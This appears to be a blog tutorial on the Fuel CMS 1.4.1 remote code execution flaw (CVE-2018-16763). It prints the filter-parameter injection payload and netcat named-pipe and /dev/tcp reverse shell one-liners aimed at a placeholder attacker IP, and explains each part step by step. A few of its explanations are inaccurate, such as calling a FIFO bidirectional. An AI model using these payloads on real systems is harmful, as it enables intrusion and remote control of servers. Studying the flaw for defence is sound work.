Introduction

Fuel CMS 1.4.1 contains a critical unauthenticated Remote Code Execution (RCE) vulnerability identified as CVE-2018–16763. This vulnerability allows attackers to execute arbitrary system commands on the target server without authentication, making it a severe security risk for organizations running vulnerable versions.

In this technical deep dive, we’ll dissect the exploit mechanism, understand how the Python exploit script works, and explore advanced reverse shell techniques used to gain persistent access to compromised systems.

Understanding the Vulnerability
Root Cause Analysis

The vulnerability exists in Fuel CMS’s page selection functionality, specifically in the /fuel/pages/select/ endpoint. The filter parameter lacks proper input sanitization, allowing attackers to inject and execute arbitrary PHP code.

Vulnerable Code Pattern:

// Simplified representation of vulnerable code
$filter = $_GET['filter'];  // Unsanitized user input
eval($filter);              // CRITICAL: Direct code execution

Attack Vector

The exploit leverages PHP’s variable function feature to bypass basic security controls:

'+pi(print($a='system'))+$a('command')+'

Execution Flow:

    $a='system' assigns the string "system" to variable $a
    print($a='system') returns the value without visible output
    pi() is called (PHP's pi function - used as obfuscation)
    $a('command') executes as system('command')

This technique cleverly disguises the system() function call, potentially evading basic security filters.

Reverse Shell Techniques

While the web shell provides command execution, it has limitations:

    No persistent connection
    Limited interactivity
    Easily detected by monitoring tools

Solution: Establish a reverse shell for full interactive access.
The Named Pipe Reverse Shell

One of the most reliable reverse shell techniques uses named pipes (FIFOs):

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP 4444 >/tmp/f

Let’s break this down comprehensively:
Part 1: Cleanup

rm /tmp/f

    Purpose: Removes any existing file named /tmp/f
    Why necessary: Previous exploit attempts may have left this file
    The semicolon (;): Command separator (equivalent to pressing Enter)

Part 2: Create Named Pipe

mkfifo /tmp/f

    Function: Creates a named pipe (FIFO = First In, First Out)
    What’s a named pipe? A special file that acts as a bidirectional data tube
    Key property: Data written to one end emerges from the other end
    Analogy: Think of it as a two-way walkie-talkie channel

Technical Details:

    Named pipes appear as files in the filesystem
    Support bidirectional communication between processes
    Block reads/writes until both ends are connected
    Enable real-time data streaming

Part 3: The Reverse Shell Pipeline

This is where the magic happens:

cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP 4444 >/tmp/f

Let’s dissect each component:
Become a Medium member

Component A: cat /tmp/f |

    Function: Continuously reads from the named pipe
    Role: Provides INPUT to bash (your commands from attacker machine)
    Behavior: Blocks until data is available in the pipe

Component B: /bin/bash -i

    Function: Starts an interactive bash shell
    -i flag: Interactive mode
    Enables command prompts
    Processes commands line by line
    Provides full shell environment

Component C: 2>&1 |

    Function: Redirects stderr to stdout
    Breakdown:
    2 = File descriptor for stderr (error messages)
    >&1 = Redirect to stdout (file descriptor 1)
    Purpose: Ensures you see both:
    Standard output (normal command results)
    Error messages (debugging information)

Component D: nc YOUR_IP 4444

    Function: Establishes network connection to attacker
    Parameters:
    YOUR_IP: Attacker's IP address
    4444: Listening port on attacker machine
    Role: The communication channel back to you

Component E: >/tmp/f

    Function: Redirects netcat output back to the named pipe
    Purpose: Creates the feedback loop
    Result: Completes the bidirectional communication circuit

Step-by-Step Execution Flow

    Attacker types command (e.g., “whoami”)
    Command travels through TCP to target’s netcat
    Netcat writes to /tmp/f (named pipe)
    cat reads from /tmp/f and pipes to bash
    Bash executes the command (“whoami”)
    Output goes to netcat (including errors via 2>&1)
    Netcat sends output back to attacker over network
    Netcat also writes to /tmp/f (completing the loop)
    Attacker sees result in their terminal
    Process repeats for next command

Why Named Pipes Instead of Simple Redirect?

Without named pipe (doesn’t work):

bash -i >& /dev/tcp/ATTACKER_IP/4444

One-way communication only, it can send OR receive, not both

With named pipe (works perfectly):

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

Bidirectional communication, means, full interactive shell

The Difference:

    Named pipes create a feedback loop
    Enables true interactive shell experience
    Commands flow IN, results flow OUT
    Continuous, persistent connection

Real-World Analogy

Think of it like a phone call vs. a walkie-talkie:

Without named pipe:

    Like leaving a voicemail — you speak, they listen later
    No real-time interaction
    One direction at a time

With named pipe:

    Like a phone call — both parties can speak and listen
    Real-time conversation
    Bidirectional communication
    The pipe is like the phone line connecting you
